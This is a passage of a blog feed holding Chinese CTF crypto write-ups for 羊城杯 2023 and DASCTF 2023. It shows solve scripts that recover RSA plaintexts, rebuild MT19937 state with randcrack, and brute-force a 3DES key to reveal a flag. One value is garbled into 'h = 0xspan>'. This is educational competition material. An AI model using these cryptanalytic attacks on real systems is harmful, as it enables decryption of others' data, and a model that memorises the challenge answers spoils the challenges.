class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>r <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">3</span> <span class=\"token operator\">**</span> i <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">64</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dec</span><span class=\"token punctuation\">(</span>S<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    ans <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">for</span> t <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">if</span> S <span class=\"token operator\">>=</span> t<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            ans<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            S <span class=\"token operator\">-=</span> t</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'find </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>t<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, S &lt;- </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>S<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            ans<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">return</span> ans<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>ans <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> dec<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>d <span class=\"token operator\">=</span> invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token comment\"># refer：https://www.ruanx.net/lattice-2/</span></pre></td></tr></table></figure><h3 id=\"signincrypto\"><a class=\"markdownIt-Anchor\" href=\"#signincrypto\">#</a> SigninCrypto</h3>\n<p>关于 mt19937 预测这部分，用图示说明。64 比特的 rand 实际上也是由两个 32 比特的 rand 堆叠而成的，其中先生成的 32 比特放在低位，后生成的放在高位。红色部分是题目给的 32 比特中的低 16 比特。缺失的高 16 比特恰好可以由第一次 <code>seed(rseed)</code>  之后的输出来填补，这是因为 16 比特 rand 的生成原理是取 32 比特 rand 的高 16 位。</p>\n<p>![image](./ 羊城杯网络安全大赛初赛 2023/2902310-20230903142751160-582806613.jpg)</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> randcrack <span class=\"token keyword\">import</span> RandCrack</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>f<span class=\"token operator\">=</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'task.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p16<span class=\"token operator\">=</span>f<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">624</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p64<span class=\"token operator\">=</span>f<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">624</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p64<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p16<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> p16<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p64<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> p64<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p32<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">624</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    temp<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">[</span>i<span class=\"token operator\">//</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bin</span><span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    t1<span class=\"token operator\">=</span><span class=\"token builtin\">bin</span><span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>zfill<span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    t2<span class=\"token operator\">=</span><span class=\"token builtin\">bin</span><span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>zfill<span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>t2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    t1<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bin</span><span class=\"token punctuation\">(</span>p16<span class=\"token punctuation\">[</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>t1<span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    t2<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bin</span><span class=\"token punctuation\">(</span>p16<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>t2<span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    p32<span class=\"token punctuation\">.</span>extend<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>t2<span class=\"token punctuation\">,</span>t1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>rc<span class=\"token operator\">=</span>RandCrack<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> p32<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    rc<span class=\"token punctuation\">.</span>submit<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">.</span>predict_getrandbits<span class=\"token punctuation\">(</span><span class=\"token number\">64</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>恢复 mt 的 state 之后可以得到 K2，K3 是 flag 前 8 字节，仅有一个字节未知，直接爆破即可；K1 仅 8 字节长，可以通过 xor 的高位来判断，因此 <code>os.urandom(2)</code>  的值也知道了，那么直接异或回去得到 K1；IV 已知高位 4 个字节 (大写字母)，剩下四个字节，利用哈希值来爆破字母即可。最后解一个 3des。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> itertools</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Cipher <span class=\"token keyword\">import</span> DES3</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>strxor <span class=\"token keyword\">import</span> strxor</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> hashlib</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">from</span> binascii <span class=\"token keyword\">import</span> unhexlify</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token string\">b'a6546bd93bced0a8533a5039545a54d1fee647007df106612ba643ffae850e201e711f6e193f15d2124ab23b250bd6e1'</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>c <span class=\"token operator\">=</span> unhexlify<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>h <span class=\"token operator\">=</span> <span class=\"token number\">0xspan></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>hint2 <span class=\"token operator\">=</span> <span class=\"token number\">22078953819177294945130027344</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>hint2 <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span>hint2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>hint2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>iv1 <span class=\"token operator\">=</span> <span class=\"token string\">b'GWHT'</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>iv2 <span class=\"token operator\">=</span> <span class=\"token string\">b'GWHT'</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>digest1 <span class=\"token operator\">=</span> hashlib<span class=\"token punctuation\">.</span>sha512<span class=\"token punctuation\">(</span>iv1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>digest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>digest2 <span class=\"token operator\">=</span> hashlib<span class=\"token punctuation\">.</span>sha512<span class=\"token punctuation\">(</span>iv2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>digest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>digest<span class=\"token operator\">=</span>digest1<span class=\"token operator\">+</span>digest2</pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>bytes_to_long<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>digest<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>IV <span class=\"token operator\">=</span> <span class=\"token string\">b'GWHTGWHT'</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>k2 <span class=\"token operator\">=</span> <span class=\"token number\">8623025688911679118</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>k2<span class=\"token punctuation\">.</span>bit_length<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>K2 <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span>k2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>xo <span class=\"token operator\">=</span> <span class=\"token number\">334648638865560142973669981316964458403</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\"># 要注意 K1 仅 8 个字节</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>xxo <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span>xo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>K1 <span class=\"token operator\">=</span> strxor<span class=\"token punctuation\">(</span>xxo<span class=\"token punctuation\">,</span><span class=\"token string\">b'\\xfb\\xc2\\xfb\\xc2\\xfb\\xc2\\xfb\\xc2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>K3_ <span class=\"token operator\">=</span> <span class=\"token string\">b'DASCTF&#123;'</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token punctuation\">(</span>string<span class=\"token punctuation\">.</span>ascii_letters <span class=\"token operator\">+</span> string<span class=\"token punctuation\">.</span>digits <span class=\"token operator\">+</span> <span class=\"token string\">'@'</span> <span class=\"token operator\">+</span> <span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    K3 <span class=\"token operator\">=</span> K3_ <span class=\"token operator\">+</span> i<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    KEY <span class=\"token operator\">=</span> K1 <span class=\"token operator\">+</span> K2 <span class=\"token operator\">+</span> K3</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    mode <span class=\"token operator\">=</span> DES3<span class=\"token punctuation\">.</span>MODE_CBC</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    des3 <span class=\"token operator\">=</span> DES3<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>KEY<span class=\"token punctuation\">,</span> mode<span class=\"token punctuation\">,</span> IV<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    m <span class=\"token operator\">=</span> des3<span class=\"token punctuation\">.</span>decrypt<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token string\">b'DASCTF'</span> <span class=\"token keyword\">in</span> m<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token comment\"># b'DASCTF&#123;8e5ee461-f4e1-4af2-8632-c9d62f4dc073&#125;\\x04\\x04\\x04\\x04'</span></pre></td></tr></table></figure><p>分类: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvY2F0ZWdvcnkvMjIwMjk5Ny5odG1s\">WriteUp</span></p>\n<p>标签: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvdGFnL2NyeXB0by8=\">crypto</span> , <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvdGFnL3dyaXRldXAv\">writeup</span></p>\n",
            "tags": []
        },
        {
            "id": "http://waltcsz.github.io/2023/12/",
            "url": "http://waltcsz.github.io/2023/12/",
            "title": "",
            "date_published": "2023-12-05T15:32:41.231Z",
            "content_html": "<h1 id=\"dasctf-x-0psu3-2023\"><a class=\"markdownIt-Anchor\" href=\"#dasctf-x-0psu3-2023\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvYXJ0aWNsZXMvMTc4NjEzMzguaHRtbA==\"> DASCTF X 0psu3 2023</span></h1>\n<p>重点要放在科研上面了，偶尔看点简单题。</p>\n<h2 id=\"generateprime\"><a class=\"markdownIt-Anchor\" href=\"#generateprime\">#</a> GeneratePrime</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>n<span class=\"token operator\">=</span><span class=\"token number\">43090231453250894711427929679917165532091051269639380881822679198388872373018031295429558758883298138388596507242928145888959963579111847255588834248367032580980272245414738073179172684104908272069503607376171584936239696444309039211273376010193165083254209608051430794825261116490356392215410064858020176711199543381037420111454942356936721487016187240237683725310306748046587503625096246489043270381153251813360521583717685413070481576320194446237522118380283335294528606720928637529817170809666802598938788405154468683850385277659812316577873886708164549255359514776884765904417881419804464020855420288884972204146588152412816874161445668955639456202226751519881834234916642218078966066353317917939418964763844067220460513388433020071277477619189495465483910271310025371745344364984826481983188861624474015117761898377237745775289039922285111681410319016537270412509750339539020876501534842403407208957382830000761065368861209033791387480377889838737241326116532852335478193204425626487166234964754732945953080086117315162916374952094149599597509405176646068341218684523765974759907645226607364627690026025662221036766148813918691578120023886400197652148214238256715089883892069133754778609710846757189987335827693169644541734443763194942694587436469448973201513131503797898892822373949177030567791519349220158287318717788746060997955057747930375117780320371517616412423571775682868481089431670802944047375824503353609019686495670630728618082254293585479431369645935654024149490741245953271830453426444847467908952699660750809490650479987</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>e<span class=\"token operator\">=</span><span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>c<span class=\"token operator\">=</span><span class=\"token number\">30862228874892553476569860337345503267926249096036551213683005116620750680365154103242717714230966827288361499342464202425467642950081816675486231250411347472976482409360391136808439034217688010072648722396312121758844966972323513456884732046270240934002095706243044210312663525491282667971502534420245427643076262414036655243117610886157895994101178663474990136516153062956803591842233732498519246731337518545018734984319536536205092573418457928952414660837594265802406473201400259189950484841504227372735345451459452313825309333631615286962304963039625162366186574440146535361888708570569938418676320446653266676364765870547213167058713058609788316647593834008151805692510044158607162858906528913516242904419457446211348504248317409844426309455978985314882123424453618672960876022996245213882467954521212481418830104602302179759479012618982228223244131619557639469872139485197176384683400796204681045965981417650462297978265085323342772310690638049411549216990505001950512428646871875659468885490055363436412364532718888124906227240501145227269727887236864060558999336443165765870556727793253297515155026234234422303238380776900105115890363548589834345888430695886678231459920101695996112312269637459823479947618045447071359886515163416153117176539752947700226596291435270282598638974889205601333097978743387412651687356072223691445472690647184292120882095587563356691450107194982597794937293154289560470269606300576216128045797481404606810315677962659136641943747123985144899464108823536597185386155005111274476874957827391438859327653936</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>k <span class=\"token operator\">=</span> <span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>R <span class=\"token operator\">=</span> Zmod<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"x\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    Q <span class=\"token operator\">=</span> R<span class=\"token punctuation\">.</span>quo<span class=\"token punctuation\">(</span>R<span class=\"token punctuation\">.</span>random_element<span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    pp <span class=\"token operator\">=</span> gcd<span class=\"token punctuation\">(</span>ZZ<span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span>Q<span class=\"token punctuation\">.</span>random_element<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">if</span> pp <span class=\"token operator\">!=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        qq <span class=\"token operator\">=</span> <span class=\"token builtin\">sum</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>pp<span class=\"token operator\">**</span>i <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        rr <span class=\"token operator\">=</span> n <span class=\"token operator\">//</span> <span class=\"token punctuation\">(</span>pp <span class=\"token operator\">*</span> qq<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">assert</span> n <span class=\"token operator\">==</span> pp <span class=\"token operator\">*</span> qq <span class=\"token operator\">*</span> rr</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>pp <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>qq <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>rr <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>d <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>ZZ<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"findprime\"><a class=\"markdownIt-Anchor\" href=\"#findprime\">#</a> FindPrime</h2>\n<p>agcd 方法恢复 p：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'output.txt'</span><span class=\"token 